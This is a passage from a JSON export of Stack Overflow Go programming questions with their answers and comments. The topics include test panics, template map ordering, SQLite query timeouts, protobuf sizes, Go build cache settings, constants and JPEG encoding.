/usr/local/Cellar/go/1.11.1/libexec/src/testing/testing.go:792 +0x387\n       | panic(0x1642c20, 0x1f46a80)\n       |    /usr/local/Cellar/go/1.11.1/libexec/src/runtime/panic.go:513 +0x1b9\n       | github.com/kubicorn/kubicorn/cloud/vmware/vmwareSdkGo.TestSdk(0xc00019a100)\n       |    /Users/jonma/go/src/github.com/kubicorn/kubicorn/cloud/vmware/vmwareSdkGo/sdk_test.go:51\n  +0x121\n       | testing.tRunner(0xc00019a100, 0x1825b48)\n       |    /usr/local/Cellar/go/1.11.1/libexec/src/testing/testing.go:827 +0xbf\n       | created by testing.(*T).Run\n       |    /usr/local/Cellar/go/1.11.1/libexec/src/testing/testing.go:878 +0x353 FAIL |    github.com/kubicorn/kubicorn/cloud/vmware/vmwareSdkGo   0.019s</p>\n</blockquote>\n\n<p>This is what I changed to, the problem with this approach is that, error message gets not displayed just some long stack trace</p>\n\n<pre><code>func TestSdk(t *testing.T) {\n    ctx := context.Background()\n\n    sdk, err := NewSdk(ctx)\n\n    assert.Errorf(\"Unable to get VMware SDK: %v\", err)\n\n    defer sdk.GovClient.Logout(ctx)\n}\n</code></pre>\n\n<blockquote>\n  <p>FAIL | --- FAIL: TestSdk (0.00s)\n       | panic: runtime error: invalid memory address or nil pointer dereference [recovered]\n       |    panic: runtime error: invalid memory address or nil pointer dereference\n       | [signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x151eecf]\n       | goroutine 6 [running]:\n       | testing.tRunner.func1(0xc00019e100)\n       |    /usr/local/Cellar/go/1.11.1/libexec/src/testing/testing.go:792 +0x387\n       | panic(0x1645200, 0x1f4aab0)\n       |    /usr/local/Cellar/go/1.11.1/libexec/src/runtime/panic.go:513 +0x1b9\n       | github.com/kubicorn/kubicorn/cloud/vmware/vmwareSdkGo.TestSdk(0xc00019e100)\n       |    /Users/jonma/go/src/github.com/kubicorn/kubicorn/cloud/vmware/vmwareSdkGo/sdk_test.go:57\n  +0x1ef\n       | testing.tRunner(0xc00019e100, 0x1828420)\n       |    /usr/local/Cellar/go/1.11.1/libexec/src/testing/testing.go:827 +0xbf\n       | created by testing.(*T).Run\n       |    /usr/local/Cellar/go/1.11.1/libexec/src/testing/testing.go:878 +0x353 FAIL |    github.com/kubicorn/kubicorn/cloud/vmware/vmwareSdkGo   0.034s</p>\n</blockquote>\n\n<p>Here I'm missing the actual error message from the function that was called.</p>\n"}, {"tags": ["go", "templating-engine"], "comments": [{"owner": {"reputation": 28754, "user_id": 1153938, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/deBjQ.jpg?s=128&g=1", "display_name": "Vorsprung", "link": "https://stackoverflow.com/users/1153938/vorsprung"}, "edited": false, "score": 0, "creation_date": 1540305351, "post_id": 52951512, "comment_id": 92811236, "body": "You might find my answer to this question useful <a href=\"https://stackoverflow.com/questions/52469714/how-to-prevent-a-map-from-sorting/52470170#52470170\" title=\"how to prevent a map from sorting\">stackoverflow.com/questions/52469714/&hellip;</a>"}, {"owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "edited": false, "score": 4, "creation_date": 1540305482, "post_id": 52951512, "comment_id": 92811335, "body": "<i>&quot;I have a map[string]Type which I want to iterate over in a template in order (i.e. maintain the existing ordering).&quot;</i> There is no &quot;existing&quot; order, maps are unordered. If you iterate over the map in Go, order will be random. See <a href=\"https://stackoverflow.com/questions/28930416/why-cant-go-iterate-maps-in-insertion-order/28931555#28931555\">Why can&#39;t Go iterate maps in insertion order?</a>; and <a href=\"https://stackoverflow.com/questions/39450120/map-in-order-range-loop/39450454#39450454\">Map in order range loop</a>."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540305602, "post_id": 52951512, "comment_id": 92811414, "body": "The reason for &quot;entirely unordered iteration over the map as when using range in the wider language&quot; is that maps are inherently unordered. Templates cannot do anything to change that fact."}, {"owner": {"reputation": 734, "user_id": 3846501, "user_type": "registered", "profile_image": "https://graph.facebook.com/568885093/picture?type=large", "display_name": "gjtempleton", "link": "https://stackoverflow.com/users/3846501/gjtempleton"}, "edited": false, "score": 1, "creation_date": 1540305714, "post_id": 52951512, "comment_id": 92811475, "body": "Sorry, clarified my wording slightly to make clear that I was hoping to use the unordered behaviour, not the ordering that the template package&#39;s range function imposes."}, {"owner": {"reputation": 2960, "user_id": 3521243, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/EJDD8.jpg?s=128&g=1", "display_name": "Emile Pels", "link": "https://stackoverflow.com/users/3521243/emile-pels"}, "edited": false, "score": 0, "creation_date": 1540309480, "post_id": 52951512, "comment_id": 92813870, "body": "What problem are you trying to solve?"}, {"owner": {"reputation": 18601, "user_id": 965900, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5KqAT.png?s=128&g=1", "display_name": "mkopriva", "link": "https://stackoverflow.com/users/965900/mkopriva"}, "edited": false, "score": 0, "creation_date": 1540317535, "post_id": 52951512, "comment_id": 92818033, "body": "Unfortunately for you that is how the template engine seems to be <a href=\"https://github.com/golang/go/blob/master/src/text/template/exec.go#L361-L369\" rel=\"nofollow noreferrer\">implemented</a> so you&#39;ll have to populate a slice in the order given by the map-range (you could do this in-template using a custom &quot;map_to_slice&quot; func). Alternatively you could, inside the template, pass the map to a custom func that returns a channel and range over that, to achieve a more on-the-fly feeling (e.g. <a href=\"https://play.golang.org/p/r9HWD2XC8h2\" rel=\"nofollow noreferrer\">play.golang.org/p/r9HWD2XC8h2</a>)."}, {"owner": {"reputation": 734, "user_id": 3846501, "user_type": "registered", "profile_image": "https://graph.facebook.com/568885093/picture?type=large", "display_name": "gjtempleton", "link": "https://stackoverflow.com/users/3846501/gjtempleton"}, "reply_to_user": {"reputation": 18601, "user_id": 965900, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5KqAT.png?s=128&g=1", "display_name": "mkopriva", "link": "https://stackoverflow.com/users/965900/mkopriva"}, "edited": false, "score": 1, "creation_date": 1540470512, "post_id": 52951512, "comment_id": 92883668, "body": "Thank @mkopriva . That pretty much covers what I ended up doing. For the wider context, I was trying to solve this issue: <a href=\"https://github.com/jcmoraisjr/haproxy-ingress/issues/240\" rel=\"nofollow noreferrer\">github.com/jcmoraisjr/haproxy-ingress/issues/240</a>"}], "owner": {"reputation": 734, "user_id": 3846501, "user_type": "registered", "profile_image": "https://graph.facebook.com/568885093/picture?type=large", "display_name": "gjtempleton", "link": "https://stackoverflow.com/users/3846501/gjtempleton"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 189, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1540305648, "creation_date": 1540304800, "last_edit_date": 1540305648, "question_id": 52951512, "link": "https://stackoverflow.com/questions/52951512/maintain-unordered-iteration-over-map-in-go-templating", "title": "Maintain unordered iteration over map in Go templating", "body": "<p>My problem:\nI have a map[string]Type which I want to iterate over in a template  maintaining the random ordering behaviour of the wider language.</p>\n\n<p>The Go template library states here <a href=\"https://golang.org/pkg/text/template/#hdr-Actions\" rel=\"nofollow noreferrer\">https://golang.org/pkg/text/template/#hdr-Actions</a> that :</p>\n\n<blockquote>\n  <p>If the value is a map and the\n    keys are of basic type with a defined order (\"comparable\"), the\n    elements will be visited in sorted key order.</p>\n</blockquote>\n\n<p>I know I can work around this by declaring a separate []string of the keys in the initial map, then iterate over this, i.e.:</p>\n\n<pre><code>data := map[string]DummyStruct{}\ndata[\"Windward\"] = DummyStruct{\"Windward\", 15}\ndata[\"Phlebas\"] = DummyStruct{\"Phlebas\", 3}\ndata[\"Art\"] = DummyStruct{\"Art\", 3}\ni := 0\nindices := make([]string, len(data))\nfor name, value := range data {\n        fmt.Printf(\"%v, %v\\n\", name, value)\n    indices[i] = name\n    i ++\n}\n</code></pre>\n\n<p>however I was hoping for this being a fully native, supported feature of the templating library to match the behaviour across the wider language, however it doesn't seem to be supported at all.</p>\n\n<p>See the Playground here for a full example: <a href=\"https://play.golang.org/p/1oTI56G5pr9\" rel=\"nofollow noreferrer\">https://play.golang.org/p/1oTI56G5pr9</a></p>\n"}, {"tags": ["unit-testing", "go", "sqlite"], "comments": [{"owner": {"reputation": 1209, "user_id": 8256506, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PlvCt.png?s=128&g=1", "display_name": "nilsocket", "link": "https://stackoverflow.com/users/8256506/nilsocket"}, "edited": false, "score": 0, "creation_date": 1540302086, "post_id": 52950587, "comment_id": 92809027, "body": "why not run it in another goroutine?"}, {"owner": {"reputation": 3055, "user_id": 3528562, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356446110eb2675dfd9190c0e8e69ace?s=128&d=identicon&r=PG&f=1", "display_name": "Zoyd", "link": "https://stackoverflow.com/users/3528562/zoyd"}, "reply_to_user": {"reputation": 1209, "user_id": 8256506, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PlvCt.png?s=128&g=1", "display_name": "nilsocket", "link": "https://stackoverflow.com/users/8256506/nilsocket"}, "edited": false, "score": 0, "creation_date": 1540302683, "post_id": 52950587, "comment_id": 92809452, "body": "Because that is not what the specification on which I am working says. I only included the relevant parts here. Basically, it boils down to: a query is run, but it should be killed if it takes too long, and I am trying to have a unit test for this."}, {"owner": {"reputation": 193, "user_id": 9957458, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YonLx.jpg?s=128&g=1", "display_name": "Radu Ciurlea", "link": "https://stackoverflow.com/users/9957458/radu-ciurlea"}, "edited": false, "score": 0, "creation_date": 1540329227, "post_id": 52950587, "comment_id": 92823220, "body": "Why test this in your code? It&#39;s a sql driver feature, it should be tested there."}, {"owner": {"reputation": 5548, "user_id": 4625526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6378aa788195a771461c5043057e2ed5?s=128&d=identicon&r=PG&f=1", "display_name": "Norbert van Nobelen", "link": "https://stackoverflow.com/users/4625526/norbert-van-nobelen"}, "edited": false, "score": 0, "creation_date": 1540352570, "post_id": 52950587, "comment_id": 92828330, "body": "<a href=\"https://stackoverflow.com/questions/7370761/sqlite-loop-statements\" title=\"sqlite loop statements\">stackoverflow.com/questions/7370761/sqlite-loop-statements</a> the 5 times upvoted answer of Rob should provide a slow/ long enough run for a query"}, {"owner": {"reputation": 3055, "user_id": 3528562, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356446110eb2675dfd9190c0e8e69ace?s=128&d=identicon&r=PG&f=1", "display_name": "Zoyd", "link": "https://stackoverflow.com/users/3528562/zoyd"}, "edited": false, "score": 0, "creation_date": 1540365964, "post_id": 52950587, "comment_id": 92833015, "body": "Unfortunately, they use CTE\u2019s. Maybe a better question would be how to make them work in Go/Sqlite3, or why they don\u2019t."}], "owner": {"reputation": 3055, "user_id": 3528562, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/356446110eb2675dfd9190c0e8e69ace?s=128&d=identicon&r=PG&f=1", "display_name": "Zoyd", "link": "https://stackoverflow.com/users/3528562/zoyd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1540304813, "creation_date": 1540302008, "last_edit_date": 1540304813, "question_id": 52950587, "link": "https://stackoverflow.com/questions/52950587/how-to-launch-a-long-running-sqlite-query-in-go", "title": "How to launch a long-running SQLite query in Go?", "body": "<p>I have a code that, when needed, interrupts a Sqlite query using a context with a deadline. My problem is to write a unit test for it: I need to launch a query that I know will run for a long time, ideally in an infinite loop, and check that it is interrupted. I use <a href=\"https://github.com/mattn/go-sqlite3\" rel=\"nofollow noreferrer\">https://github.com/mattn/go-sqlite3</a> to access Sqlite 3 from Go.</p>\n\n<p>For example, this:</p>\n\n<pre><code>with recursive rec as \n   (select 1 as n union all select n + 1 from rec) \nselect n from rec;\n</code></pre>\n\n<p>returns 1 immediately instead of looping, as it does in the SQLite console (is there something to do to enable CTE\u2019s?). I also found no <code>sleep</code> function or anything similar.</p>\n"}, {"tags": ["go", "proto"], "answers": [{"tags": [], "owner": {"reputation": 141, "user_id": 4143680, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-EZtiINlnyus/AAAAAAAAAAI/AAAAAAAABQc/se2NRS39sZw/photo.jpg?sz=128", "display_name": "Henry Henderson", "link": "https://stackoverflow.com/users/4143680/henry-henderson"}, "is_accepted": false, "score": 0, "last_activity_date": 1540301495, "creation_date": 1540301495, "answer_id": 52950401, "question_id": 52949803, "link": "https://stackoverflow.com/questions/52949803/golang-protobuf-marshal-empty-struct-with-fixed-size/52950401#52950401", "title": "golang protobuf marshal empty struct with fixed size", "body": "<p>You are calling <code>len()</code> on a byte array. It is going to count the number of elements in that array, and return it. </p>\n\n<p>If you have just instantiated a new, empty, protobuf pointer object with nothing inside, the marshaled byte array will not hold any data -- thus why you're getting <code>0</code>.</p>\n\n<p>I'm quite unsure what you're wanting it to return instead. Could you clarify your question a bit more with what you're wanting the output to be? I can maybe better answer your question.</p>\n"}, {"tags": [], "owner": {"reputation": 9777, "user_id": 121631, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85801ee3b7b70969f6713aaa5768ca20?s=128&d=identicon&r=PG", "display_name": "David Budworth", "link": "https://stackoverflow.com/users/121631/david-budworth"}, "is_accepted": true, "score": 1, "last_activity_date": 1540316107, "last_edit_date": 1540316107, "creation_date": 1540315653, "answer_id": 52954707, "question_id": 52949803, "link": "https://stackoverflow.com/questions/52949803/golang-protobuf-marshal-empty-struct-with-fixed-size/52954707#52954707", "title": "golang protobuf marshal empty struct with fixed size", "body": "<p>There are two issues here</p>\n\n<p>1) protobuf uses varint encoding for integers, so the size depends on the value, see <a href=\"https://developers.google.com/protocol-buffers/docs/encoding\" rel=\"nofollow noreferrer\">this link</a></p>\n\n<p>2) zero value fields are not transmitted by default, so because the two integers are zero, even their field identifiers are not sent.  I'm actually not sure there's even an option to send zero values looking at <a href=\"https://github.com/golang/protobuf\" rel=\"nofollow noreferrer\">the docs</a> </p>\n\n<p>if you set them both to 1, you will have more than zero bytes, but it still won't be fixed in length, depending on range of the values</p>\n\n<p>so, there's no real way to enforce fixed size in protobuf messages in general</p>\n\n<p>if you want fixed length messages, you are probably better off using direct structs-on-the-wire type encoding, but then that's harder for language interop as they'd all have to define the same message and you'd lose easy message migrations and all the cool stuff that protobuf gives.</p>\n\n<p><a href=\"https://capnproto.org/\" rel=\"nofollow noreferrer\">Cap'n Proto</a> might have an option for fixed size structs, but they also generally compress which will, once again, produce variable length messages.</p>\n\n<p>If you describe the problem you are trying to ultimately solve, we may be able to suggest other alternatives.</p>\n"}], "owner": {"reputation": 1071, "user_id": 3296612, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/DXU72.jpg?s=128&g=1", "display_name": "xren", "link": "https://stackoverflow.com/users/3296612/xren"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 636, "favorite_count": 0, "accepted_answer_id": 52954707, "answer_count": 2, "score": 0, "last_activity_date": 1540316107, "creation_date": 1540299773, "last_edit_date": 1540304638, "question_id": 52949803, "link": "https://stackoverflow.com/questions/52949803/golang-protobuf-marshal-empty-struct-with-fixed-size", "title": "golang protobuf marshal empty struct with fixed size", "body": "<p>I hava a protobuf struct <code>Data</code></p>\n\n<p>in <code>.proto</code>:</p>\n\n<pre><code>message Data {\n    uint64 ID = 1;\n    uint32 GUID = 2;\n}\n</code></pre>\n\n<p>in golang</p>\n\n<pre><code>b, err := proto.Marshal(&amp;pb.Data{})\nif err != nil {\n    panic(err)\n}\nfmt.Println(len(b))\n</code></pre>\n\n<p>I got <code>0</code> length!</p>\n\n<p>How can I make proto.Marshal always return fixed size no matter what pb.Data is?</p>\n\n<p>ps.</p>\n\n<p>pb.Data only contains <code>int64</code> and <code>int32</code></p>\n"}, {"tags": ["go"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user8725011"}, "edited": false, "score": 0, "creation_date": 1540317578, "post_id": 52949200, "comment_id": 92818052, "body": "How Embarrassing. That&#39;s it. Thank you."}, {"owner": {"user_type": "does_not_exist", "display_name": "user8725011"}, "edited": false, "score": 0, "creation_date": 1540317648, "post_id": 52949200, "comment_id": 92818089, "body": "The disadvantage is, that go modules can&#39;t be used outside of GOPATH, when GOCACHE=off is set."}], "tags": [], "owner": {"reputation": 9005, "user_id": 675637, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/8X97W.jpg?s=128&g=1", "display_name": "poy", "link": "https://stackoverflow.com/users/675637/poy"}, "is_accepted": true, "score": 1, "last_activity_date": 1540297947, "creation_date": 1540297947, "answer_id": 52949200, "question_id": 52948250, "link": "https://stackoverflow.com/questions/52948250/how-do-i-automatically-clean-the-go-cache-in-visual-code-before-running-tests/52949200#52949200", "title": "How do I automatically clean the go cache in Visual Code before running tests?", "body": "<p>Try setting the environment variable <code>GOCACHE=off</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 1034911, "user_id": 6309, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7aa22372b695ed2b26052c340f9097eb?s=128&d=identicon&r=PG", "display_name": "VonC", "link": "https://stackoverflow.com/users/6309/vonc"}, "is_accepted": false, "score": 1, "last_activity_date": 1547335478, "last_edit_date": 1592644375, "creation_date": 1547335478, "answer_id": 54164803, "question_id": 52948250, "link": "https://stackoverflow.com/questions/52948250/how-do-i-automatically-clean-the-go-cache-in-visual-code-before-running-tests/54164803#54164803", "title": "How do I automatically clean the go cache in Visual Code before running tests?", "body": "<p>Warning from <a href=\"https://github.com/golang/go/issues/26809#issuecomment-410477084\" rel=\"nofollow noreferrer\">issue 26809 (&quot;GOCACHE=off causes modules to exit the tests&quot;)</a>:</p>\n<blockquote>\n<p>The <code>GOCACHE</code> env variable will be phased out out in 1.12, and cannot be used with <code>go modules</code> enabled in 1.11</p>\n</blockquote>\n<p>Configuring VSCode to use using <code>go test -count=1 ...</code> is safer.</p>\n<p>The <a href=\"https://tip.golang.org/doc/go1.12#gocache\" rel=\"nofollow noreferrer\">Go 1.12 release notes</a> (for February 2019) makes that official:</p>\n<blockquote>\n<h2>Build cache requirement</h2>\n<p>The build cache is now required as a step toward eliminating <code>$GOPATH/pkg</code>.<br />\nSetting the environment variable <code>GOCACHE=off</code> will cause <code>go</code> commands that write to the cache to fail.</p>\n</blockquote>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8725011"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1443, "favorite_count": 1, "accepted_answer_id": 52949200, "answer_count": 2, "score": 5, "last_activity_date": 1547335478, "creation_date": 1540295078, "question_id": 52948250, "link": "https://stackoverflow.com/questions/52948250/how-do-i-automatically-clean-the-go-cache-in-visual-code-before-running-tests", "title": "How do I automatically clean the go cache in Visual Code before running tests?", "body": "<p>There is a small nuisance with Visual Code and Go, but is mainly related to the most recent release of go 1.11.x and the newly introduced module system. The go builder creates a folder called 'auto' for cached builds, which can be cleaned / deleted via 'go clean -cache'. </p>\n\n<p>Visual Code seems to be confused when executing tests, if such a directory is present, and complains about missing dependencies:</p>\n\n<pre><code>/home/user/.golang/src/github.com/stretchr/testify/assert/assertions.go:20:2: could not import github.com/pmezard/go-difflib/difflib (open auto/4c/4cb1f0f2c9f328e3cade99998704759897fd4e530af38db25c85cdc253c1f1a0-d: no such file or directory)\n</code></pre>\n\n<p>is there any possibility to fix this? Or is it just another setting I forgot to make?</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 1209, "user_id": 8256506, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PlvCt.png?s=128&g=1", "display_name": "nilsocket", "link": "https://stackoverflow.com/users/8256506/nilsocket"}, "edited": false, "score": 6, "creation_date": 1540292791, "post_id": 52947440, "comment_id": 92803016, "body": "<code>const</code> is a keyword, you should access it normally <code>queryGetAllCustomer</code> as any other variable"}, {"owner": {"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "edited": false, "score": 4, "creation_date": 1540293305, "post_id": 52947440, "comment_id": 92803317, "body": "Please take a <a href=\"https://tour.golang.org/welcome/1\" rel=\"nofollow noreferrer\">go lang tour</a> for checking how variables and constants are declared"}], "answers": [{"tags": [], "owner": {"reputation": 2960, "user_id": 3521243, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/EJDD8.jpg?s=128&g=1", "display_name": "Emile Pels", "link": "https://stackoverflow.com/users/3521243/emile-pels"}, "is_accepted": true, "score": 1, "last_activity_date": 1540298508, "last_edit_date": 1540298508, "creation_date": 1540292850, "answer_id": 52947502, "question_id": 52947440, "link": "https://stackoverflow.com/questions/52947440/calling-const-from-parameter-in-golang/52947502#52947502", "title": "Calling const from parameter in golang", "body": "<p>It seems you're assuming that <code>queryGetAllCustomer</code> \"belongs to\" <code>const</code>. Const is not a scope but just an access modifier though, these two snippets produce identical results:</p>\n\n<pre><code>const (\n    queryGetAllCustomer = \"...\"\n    queryGetOneCustomer = \"...\"\n)\n\n// and...\n\nconst queryGetAllCustomer = \"...\"\nconst queryGetOneCustomer = \"...\"\n</code></pre>\n\n<p>You can therefore simply reference the value with <code>queryGetAllCustomer</code> (or <code>dao.QueryGetAllCustomer</code> from another package, had it been exported):</p>\n\n<pre><code>queryText := queryGetAllCustomer\n</code></pre>\n"}], "owner": {"reputation": 18, "user_id": 10063131, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-cQAF1gu3oHs/AAAAAAAAAAI/AAAAAAAAAPc/kFL_zVD1pyo/photo.jpg?sz=128", "display_name": "rudy tjhia", "link": "https://stackoverflow.com/users/10063131/rudy-tjhia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "closed_date": 1540298315, "accepted_answer_id": 52947502, "answer_count": 1, "score": -3, "last_activity_date": 1540298508, "creation_date": 1540292603, "question_id": 52947440, "link": "https://stackoverflow.com/questions/52947440/calling-const-from-parameter-in-golang", "closed_reason": "Not suitable for this site", "title": "Calling const from parameter in golang", "body": "<p>so I want to make my project having a project sets like this </p>\n\n<pre><code> GoTraining\n   -Controllers\n       ListController\n   -Service\n       ListService that doing business process and\n       calling data Access Object (DAO) to get data\n   -DAO\n       List query and Model(Const)\n   -.gitignore\n   -config.conf\n   -main.go\n   -readme.md\n</code></pre>\n\n<p>that just the picture of my structure , and now come where I get confused\nI create a package in dao called customerDao.go and write all of my query inside <strong>const</strong> and I try to make a function called queryFilter with queryType as the parameter and I want to search the const base on the queryType I got as parameter for some reason it give me an error message said that</p>\n\n<p><strong>\"Syntax Error : unexpected const, expecting expression(8,16)\"</strong>\n<a href=\"https://i.stack.imgur.com/ibCQH.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ibCQH.png\" alt=\"enter image description here\"></a></p>\n\n<p>can anyone tell me what I do wrong here?</p>\n"}, {"tags": ["image", "go", "jpeg"], "comments": [{"owner": {"reputation": 1875, "user_id": 8803266, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0PJdh.png?s=128&g=1", "display_name": "Oliver Baumann", "link": "https://stackoverflow.com/users/8803266/oliver-baumann"}, "edited": false, "score": 0, "creation_date": 1540291812, "post_id": 52946929, "comment_id": 92802420, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/1821811/how-to-read-write-from-to-file-using-go\">How to read/write from/to file using Go?</a>"}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 3, "creation_date": 1540293434, "post_id": 52946929, "comment_id": 92803394, "body": "Check your errors. Always."}], "answers": [{"comments": [{"owner": {"reputation": 742, "user_id": 9781279, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/T1zNJ.png?s=128&g=1", "display_name": "shahidammer", "link": "https://stackoverflow.com/users/9781279/shahidammer"}, "edited": false, "score": 0, "creation_date": 1540296234, "post_id": 52947903, "comment_id": 92805164, "body": "2018/10/23 14:03:42 invalid JPEG format: short Huffman data Getting this error:"}, {"owner": {"reputation": 1209, "user_id": 8256506, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PlvCt.png?s=128&g=1", "display_name": "nilsocket", "link": "https://stackoverflow.com/users/8256506/nilsocket"}, "reply_to_user": {"reputation": 742, "user_id": 9781279, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/T1zNJ.png?s=128&g=1", "display_name": "shahidammer", "link": "https://stackoverflow.com/users/9781279/shahidammer"}, "edited": false, "score": 0, "creation_date": 1540296534, "post_id": 52947903, "comment_id": 92805340, "body": "@shahidammer, data in <code>imgByte</code> should data of some image"}], "tags": [], "owner": {"reputation": 1209, "user_id": 8256506, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PlvCt.png?s=128&g=1", "display_name": "nilsocket", "link": "https://stackoverflow.com/users/8256506/nilsocket"}, "is_accepted": true, "score": 3, "last_activity_date": 1540294073, "creation_date": 1540294073, "answer_id": 52947903, "question_id": 52946929, "link": "https://stackoverflow.com/questions/52946929/how-to-covert-a-byte-object-to-an-image-and-store-it-as-a-jpeg-image-on-disk/52947903#52947903", "title": "How to covert a []byte object to an image and store it as a jpeg image on disk", "body": "<p>You are not passing <code>Options</code>,to <code>jpeg.Encode</code>, you can also set it to nil.</p>\n\n<pre><code>func serveFrames(imgByte []byte) {\n\n    img, _, err := image.Decode(bytes.NewReader(imgByte))\n    if err != nil {\n        log.Fatalln(err)\n    }\n\n    out, _ := os.Create(\"./img.jpeg\")\n    defer out.Close()\n\n    var opts jpeg.Options\n    opts.Quality = 1\n\n    err = jpeg.Encode(out, img, &amp;opts)\n    //jpeg.Encode(out, img, nil)\n    if err != nil {\n        log.Println(err)\n    }\n\n}\n</code></pre>\n\n<p>Don't forget to close any file, if opened.</p>\n\n<p>You can use <code>log.Fatalln(...)</code>, if you want to print error message and quit in-case of any error.</p>\n"}], "owner": {"reputation": 742, "user_id": 9781279, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/T1zNJ.png?s=128&g=1", "display_name": "shahidammer", "link": "https://stackoverflow.com/users/9781279/shahidammer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4008, "favorite_count": 0, "accepted_answer_id": 52947903, "answer_count": 1, "score": 2, "last_activity_date": 1540294073, "creation_date": 1540291019, "question_id": 52946929, "link": "https://stackoverflow.com/questions/52946929/how-to-covert-a-byte-object-to-an-image-and-store-it-as-a-jpeg-image-on-disk", "title": "How to covert a []byte object to an image and store it as a jpeg image on disk", "body": "<p>I am trying to convert an []byte object to an image and save it as a jpeg in Golang. I tried to use <code>Decode</code> function of image but it always returns <code>&lt;nil&gt;</code>. </p>\n\n<pre><code>func saveFrames(imgByte []byte) {\n    img, _, _ := image.Decode(bytes.NewReader(imgByte))\n   out, err := os.Create(\"./img.jpeg\")\n\n   if err != nil {\n             fmt.Println(err)\n             os.Exit(1)\n   }\n   err = jpeg.Encode(out, img)\n   if err != nil {\n            fmt.Println(err)\n            os.Exit(1)\n   }\n}\n</code></pre>\n"}, {"tags": ["go", "type-conversion"], "comments": [{"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 3, "creation_date": 1540293548, "post_id": 52946860, "comment_id": 92803471, "body": "That is how the language is <i>defined</i>. In Go you <i>cannot</i> multiply a int (a) and a float. Your a is an int and math.Pi is a float. Just read the spec. Different ruels apply for consts and for variables. That&#39;s all there is to know."}], "answers": [{"tags": [], "owner": {"reputation": 3818, "user_id": 1247113, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zRMFj.png?s=128&g=1", "display_name": "rob74", "link": "https://stackoverflow.com/users/1247113/rob74"}, "is_accepted": true, "score": 4, "last_activity_date": 1540295924, "last_edit_date": 1540295924, "creation_date": 1540295551, "answer_id": 52948394, "question_id": 52946860, "link": "https://stackoverflow.com/questions/52946860/implicit-type-conversion-constant-vs-variables/52948394#52948394", "title": "Implicit type conversion constant vs variables", "body": "<p>It's happening because of Go's <em>untyped constants</em>. In both cases, you are not explicitly specifying a type. </p>\n\n<p>In the first case, you are defining an untyped constant (you could also define a typed constant by using <code>const a float64 = 5</code>). For an untyped constant, a type will only be inferred when it\u2019s used in a context that requires a type &ndash; i.e. when you are multiplying it with math.Pi, the compiler will \"guess\" that you want to have a float there, and everything works fine.</p>\n\n<p>In the second case, a variable of course has to have a type, so the type inference takes place when declaring the variable, and since you used \"5\", the compiler will \"infer\" int, and multiplying an int and a float is not possible in Go. You could use e.g. <code>a:=5.0</code> or <code>var a float64 = 5</code> to declare a as a float64, then this code would work as well.</p>\n\n<p>See <a href=\"https://blog.golang.org/constants\" rel=\"nofollow noreferrer\">this blog post</a> for 